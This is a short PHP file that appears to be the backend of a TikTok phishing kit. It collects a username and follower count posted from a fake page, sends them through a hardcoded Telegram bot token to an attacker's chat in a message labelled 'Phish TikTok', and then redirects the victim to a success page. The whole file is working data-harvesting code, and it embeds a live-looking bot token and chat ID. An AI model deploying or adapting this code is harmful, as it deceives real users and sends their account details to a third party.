
<?php
$token = "7570943897:AAFcJS6rG9x35gQgrZD5pWayvTO9jHYUM0U";
$chat_id = "7932600874";
$username = $_POST['username'];
$jumlah = $_POST['jumlah'];

$message = "🔥 Phish TikTok\n👤 Username: $username\n📦 Followers: $jumlah";

$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
file_get_contents($url);

header("Location: sukses.html");
exit();
?>
